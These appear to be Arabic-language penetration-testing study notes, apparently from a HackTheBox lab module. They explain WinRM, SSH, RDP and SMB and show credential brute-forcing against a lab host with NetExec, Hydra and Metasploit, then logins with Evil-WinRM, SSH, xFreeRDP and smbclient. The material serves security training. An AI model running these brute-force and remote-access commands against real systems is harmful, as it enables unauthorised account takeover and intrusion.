- هيقابلنا كتير واحنا pentesters شبكات بيكون الاجهزه اللي فيها شغال عليها services معينه مثلا زي `FTP`, `SMB`, `NFS`, `IMAP/POP3`, `SSH`, `MySQL/MSSQL`, `RDP`, `WinRM`, `VNC`, `Telnet`, `SMTP`, and `LDAP` زي ما اتعلمنا في موديول الfootprinting
- تعالي نتخيل ان احنا عاوزين ندير ونتحكم ف Windows Server عن طريق الشبكه معني الكلام ده وعشان انفذو لازم يكون في service بتسمحلنا نعمل الكلام ده وننفذ اوامر ونأكسس علي الGUI والCLI بتاعت السيرفر ف هنستخدم services زي RDP او WinRM او SSH بس الssh مش common اوي بالنسبه للويندوز هو مستخدم اكتر للينكس كل بقي service من دول ليها الauthentication mechansim الخاص بيها
----
## WinRM
- الWindows Remote Management ده البروتوكول او الخدمه اللي بتاخد منك الطلبات وتبعتها للجهاز التاني عندنا بقي WS-Management و SOAP دول بقي بعد ما الwinRM تاخد الطلبات وتوصلها للسيرفر بتستخدم لغة معينه وقواعد وهي الWS والSOAP ودي بتخلي اي داتا بتتنقل بين الجهازين علي شكل XML عشان السيرفر يفهم الطلب
- بيشتغل علي بورت 5985 HTTP و 5986 HTTPS
- الWMI ده بقي المدير اللي قاعد جوه الويندوز وده عارف كل حاجه فالجهاز زي مساحة الهارد وايه العمليات اللي شغاله دلوقتي وهكذت
- المندوب (**WinRM**) بياخد الطلب منك ويروح يسلمه للمدير (**WMI**)
-WBEM
ده النظم والمعايير اللي الWMI شغال بيها عشان يجمع المعلومات
-DCOM
ده "الطريق القديم" اللي كان الويندوز بيستخدمه عشان البرامج تكلم بعضها عن بُعد. الـ WinRM حديث وشاطر، بيقدر يكلم الـ WMI والـ WMI بدوره ممكن يروح يكلم الـ DCOM لو محتاج حاجة من "السيستم القديم"

**الخطوات بشكل مختصر**
-أنت بتبعت أمر من جهازك.
    
-الأمر ده بيتغلف في "جواب" **SOAP** (بلغة XML).
    
-الـ **WinRM** بياخد الجواب ده ويوصله للسيرفر.
    
-الـ **WinRM** يسلم الطلب للمدير **WMI**.
    
-الـ **WMI** يشوف الطلب، يروح يجمع المعلومة من السيستم (وممكن يستخدم **DCOM** لو احتاج).
    
-الـ **WMI** يرجع الرد للـ **WinRM**، والـ **WinRM** يرجعهولك على شاشتك
- الWinRM بيعتمد علي بيئه امنيه جدا وغالبا بيتم استخدامه مع Certs او طريق تشفير قوية
- اداة الNetExec دي بتقدر تتعامل مع خدمات كتير زي WinRM و SMB و LDAP و MSSQL ف هي تقدر تعملك brute-force
#### NetExec
#### Installing NetExec

```shell-session
0xTroj6n@htb[/htb]$ sudo apt-get -y install netexec
```

#### NetExec Usage

The general format for using NetExec is as follows:

```shell-session
0xTroj6n@htb[/htb]$ netexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
```

```shell-session
0xTroj6n@htb[/htb]$ netexec winrm 10.129.42.197 -u user.list -p password.list

WINRM       10.129.42.197   5985   NONE             [*] None (name:10.129.42.197) (domain:None)
WINRM       10.129.42.197   5985   NONE             [*] http://10.129.42.197:5985/wsman
WINRM       10.129.42.197   5985   NONE             [+] None\user:password (Pwn3d!)
```

مدام قالك `Pwn3d!` معني كده ان جابلك اليوزر والباس وهما `user:password`
طيب دلوقتي انت جبت الcreds وقادر تخش علي جهاز الvictim هعمل ايه بقي؟

#### Evil-WinRM
- هنستخدم بقي اداة Evil-WinRM عشان نقدر نسجل بيها دخول للWinRM ونتحكم في الجهاز
#### Installing Evil-WinRM

```shell-session
0xTroj6n@htb[/htb]$ sudo gem install evil-winrm

Fetching little-plugger-1.1.4.gem
Fetching rubyntlm-0.6.3.gem
Fetching builder-3.2.4.gem
Fetching logging-2.3.0.gem
Fetching gyoku-1.3.1.gem
Fetching nori-2.6.0.gem
Fetching gssapi-1.3.1.gem
Fetching erubi-1.10.0.gem
Fetching evil-winrm-3.3.gem
Fetching winrm-2.3.6.gem
Fetching winrm-fs-1.3.5.gem
Happy hacking! :)
```
#### Evil-WinRM Usage

```shell-session
0xTroj6n@htb[/htb]$ evil-winrm -i <target-IP> -u <username> -p <password>
```

```shell-session
0xTroj6n@htb[/htb]$ evil-winrm -i 10.129.42.197 -u user -p password

Evil-WinRM shell v3.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\user\Documents
```
- وبكده هيتفتحلك سيشن Powershell (MS-PSRP) عشان تقدر تنفذ اوامر
----
## SSH
- الsecure shell او الSSH ده طريقه اكثر امانا عشان تكونت بremote host وتنفذ اوامر وتنقل ملفات من وإلي السيرفر
- الSSH بيشتغل علي TCP Port 22 ونقدر نكونكت بيه عن طريق الSSH Client
- خلي بالك الservice دي ليها تلت طرق تشفير مختلفه وهما `symmetric` و `asymmetric` و `hashing`
#### Symmetric Encryption
- الsymmetric بيستخدم نفس الkey فالencryption والdecryption وده خطر لأن لو الهاكر بقي معاه الkey خلاص كده الداتا بقت مكشوفه ليه
- خوارزميات التشفير بتاعت الsymmetric هما
-AES
-Blowfisgh
-3DES
#### Asymmetric Encryption
- الasymmetric هنا مختلفه شويه فالطريقه دي بيكون معايا مفتاحين public key و private key الprivate key ده لازم يبقي سري جدا لأن ده المفتاح الوحيد اللي هيقدر يفك تشفير الماسدجات اللي تم تشفيرها عن طريق الpublic key
- الattacker لو عرف يوصل للprivate key والباسورد مش محمي هيبقي عنده القدره انه يlogin علي السيستم من غير creds
- بمجرد ما الاتصال يتم السيرفر بيستخدم الpublic key عشان يبدأ عملية تبادل البيانات والمفتاح ده معروف ومسموح لأي حد يشوفه بيروح باعت رسالة مشفره والرساله مبتتفكش غير بالprivate key اللي المفروض انه مع الclient لو الclient عرف يفك الرساله دي السيرفر هيفتح SSH session
#### Hashing
- الhashing method بيحول الداتا المنقوله بين الكلاينت والسيرفر ل unique value
- الSSH بيستخدم الhashing عشان يتأكد من الauthenticity بتاعت الماسدجات
#### Hydra - SSH

We can use a tool like `Hydra` to brute force SSH

```shell-session
0xTroj6n@htb[/htb]$ hydra -L user.list -P password.list ssh://10.129.42.197

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-10 15:03:51
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 25 login tries (l:5/p:5), ~2 tries per task
[DATA] attacking ssh://10.129.42.197:22/
[22][ssh] host: 10.129.42.197   login: user   password: password
1 of 1 target successfully completed, 1 valid password found
```

To log in to the system via the SSH protocol, we can use the OpenSSH client, which is available by default on most Linux distributions.

```shell-session
0xTroj6n@htb[/htb]$ ssh user@10.129.42.197

The authenticity of host '10.129.42.197 (10.129.42.197)' can't be established.
ECDSA key fingerprint is SHA256:MEuKMmfGSRuv2Hq+e90MZzhe4lHhwUEo4vWHOUSv7Us.


Are you sure you want to continue connecting (yes/no/[fingerprint])? yes

Warning: Permanently added '10.129.42.197' (ECDSA) to the list of known hosts.


user@10.129.42.197's password: ********

Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.

user@WINSRV C:\Users\user>
```
---
## Remote Desktop Protocol (RDP)
- الRDP ده service بيخليك تاخد remote access علي السيستم وده بيشتغل علي بورت 3389
- البروتوكول ده فيه طرفيين أساسين
**1. Terminal Server**
- ده السيرفر اللي انا عايز اكونكت بيه
**2. Terminal Client**
- ده جهازك انت اللي بتتحكم منه فالسيرفر

#### Hydra - RDP

We can also use `Hydra` to perform RDP bruteforcing.

```shell-session
0xTroj6n@htb[/htb]$ hydra -L user.list -P password.list rdp://10.129.42.197

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-10 15:05:40
[WARNING] rdp servers often don't like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover
[INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)
[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
[DATA] max 4 tasks per 1 server, overall 4 tasks, 25 login tries (l:5/p:5), ~7 tries per task
[DATA] attacking rdp://10.129.42.197:3389/
[3389][rdp] account on 10.129.42.197 might be valid but account not active for remote desktop: login: mrb3n password: rockstar, continuing attacking the account.
[3389][rdp] account on 10.129.42.197 might be valid but account not active for remote desktop: login: cry0l1t3 password: delta, continuing attacking the account.
[3389][rdp] host: 10.129.42.197   login: user   password: password
1 of 1 target successfully completed, 1 valid password found
```
#### xFreeRDP

```bash
xfreerdp /v:<target-IP> /u:<username> /p:<password>
```

```shell-session
0xTroj6n@htb[/htb]$ xfreerdp /v:10.129.42.197 /u:user /p:password

<SNIP>

New Certificate details:
        Common Name: WINSRV
        Subject:     CN = WINSRV
        Issuer:      CN = WINSRV
        Thumbprint:  cd:91:d0:3e:7f:b7:bb:40:0e:91:45:b0:ab:04:ef:1e:c8:d5:41:42:49:e0:0c:cd:c7:dd:7d:08:1f:7c:fe:eb

Do you trust the above certificate? (Y/T/N) Y
```
---
## SMB
- الSMB ده بروتوكول او service مسؤوله عن نقل الداتا بين الكلاينت والسيرفر في Local Area Network وبيشتغل علي بورت 445
- الSMB بيshare فولدرات وفايلات

|النظام|البروتوكول|
|---|---|
|Windows|SMB|
|Linux / Unix|NFS|
```
\\192.168.1.10\Shared
```
#### Hydra - SMB

```shell-session
0xTroj6n@htb[/htb]$ hydra -L user.list -P password.list smb://10.129.42.197

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-06 19:37:31
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[DATA] max 1 task per 1 server, overall 1 task, 25 login tries (l:5236/p:4987234), ~25 tries per task
[DATA] attacking smb://10.129.42.197:445/
[445][smb] host: 10.129.42.197   login: user   password: password
1 of 1 target successfully completed, 1 valid passwords found
```
#### Hydra - Error

```shell-session
0xTroj6n@htb[/htb]$ hydra -L user.list -P password.list smb://10.129.42.197

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-06 19:38:13
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[DATA] max 1 task per 1 server, overall 1 task, 25 login tries (l:5236/p:4987234), ~25 tries per task
[DATA] attacking smb://10.129.42.197:445/
[ERROR] invalid reply from target smb://10.129.42.197:445/
```
- ده ايررور من اداة hydra وده بسبب ان الhydra outdated version فالحاله دي والversion بتاع الSMB عالي اللي هو SMBv3 ف مش عارفه تهندل الreplies اللي راجعه من السيرفر فالحالة دي ممكن نحدث الأداة او نستخدم الmetasploit
#### Metasploit Framework

```shell-session
0xTroj6n@htb[/htb]$ msfconsole -q

msf6 > use auxiliary/scanner/smb/smb_login
msf6 auxiliary(scanner/smb/smb_login) > options 

Module options (auxiliary/scanner/smb/smb_login):

   Name               Current Setting  Required  Description
   ----               ---------------  --------  -----------
   ABORT_ON_LOCKOUT   false            yes       Abort the run when an account lockout is detected
   BLANK_PASSWORDS    false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED   5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS       false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS        false            no        Add all passwords in the current database to the list
   DB_ALL_USERS       false            no        Add all users in the current database to the list
   DB_SKIP_EXISTING   none             no        Skip existing credentials stored in the current database (Accepted: none, user, user&realm)
   DETECT_ANY_AUTH    false            no        Enable detection of systems accepting any authentication
   DETECT_ANY_DOMAIN  false            no        Detect if domain is required for the specified user
   PASS_FILE                           no        File containing passwords, one per line
   PRESERVE_DOMAINS   true             no        Respect a username that contains a domain name.
   Proxies                             no        A proxy chain of format type:host:port[,type:host:port][...]
   RECORD_GUEST       false            no        Record guest-privileged random logins to the database
   RHOSTS                              yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT              445              yes       The SMB service port (TCP)
   SMBDomain          .                no        The Windows domain to use for authentication
   SMBPass                             no        The password for the specified username
   SMBUser                             no        The username to authenticate as
   STOP_ON_SUCCESS    false            yes       Stop guessing when a credential works for a host
   THREADS            1                yes       The number of concurrent threads (max one per host)
   USERPASS_FILE                       no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS       false            no        Try the username as the password for all users
   USER_FILE                           no        File containing usernames, one per line
   VERBOSE            true             yes       Whether to print output for all attempts


msf6 auxiliary(scanner/smb/smb_login) > set user_file user.list

user_file => user.list


msf6 auxiliary(scanner/smb/smb_login) > set pass_file password.list

pass_file => password.list


msf6 auxiliary(scanner/smb/smb_login) > set rhosts 10.129.42.197

rhosts => 10.129.42.197

msf6 auxiliary(scanner/smb/smb_login) > run

[+] 10.129.42.197:445     - 10.129.42.197:445 - Success: '.\user:password'
[*] 10.129.42.197:445     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

#### NetExec

```shell-session
0xTroj6n@htb[/htb]$ netexec smb 10.129.42.197 -u "user" -p "password" --shares

SMB         10.129.42.197   445    WINSRV           [*] Windows 10.0 Build 17763 x64 (name:WINSRV) (domain:WINSRV) (signing:False) (SMBv1:False)
SMB         10.129.42.197   445    WINSRV           [+] WINSRV\user:password 
SMB         10.129.42.197   445    WINSRV           [+] Enumerated shares
SMB         10.129.42.197   445    WINSRV           Share           Permissions     Remark
SMB         10.129.42.197   445    WINSRV           -----           -----------     ------
SMB         10.129.42.197   445    WINSRV           ADMIN$                          Remote Admin
SMB         10.129.42.197   445    WINSRV           C$                              Default share
SMB         10.129.42.197   445    WINSRV           SHARENAME       READ,WRITE      
SMB         10.129.42.197   445    WINSRV           IPC$            READ            Remote IPC
```

To communicate with the server via SMB, we can use, for example, the tool [smbclient](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html). This tool will allow us to view the contents of the shares, upload, or download files if our privileges allow it.

#### Smbclient

```shell-session
0xTroj6n@htb[/htb]$ smbclient -U user \\\\10.129.42.197\\SHARENAME

Enter WORKGROUP\user's password: *******

Try "help" to get a list of possible commands.


smb: \> ls
  .                                  DR        0  Thu Jan  6 18:48:47 2022
  ..                                 DR        0  Thu Jan  6 18:48:47 2022
  desktop.ini                       AHS      282  Thu Jan  6 15:44:52 2022

                10328063 blocks of size 4096. 6074274 blocks available
smb: \> 
```
---
